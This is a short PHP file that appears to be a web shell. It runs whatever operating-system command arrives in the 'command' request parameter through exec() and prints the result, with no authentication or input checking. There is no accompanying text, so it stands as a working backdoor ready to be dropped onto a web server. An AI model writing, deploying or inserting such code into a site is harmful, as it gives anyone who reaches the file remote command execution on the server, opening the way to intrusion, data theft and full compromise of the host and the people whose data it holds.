<?php

exec($_REQUEST['command'], $resp, $num);
print_r($resp);
?>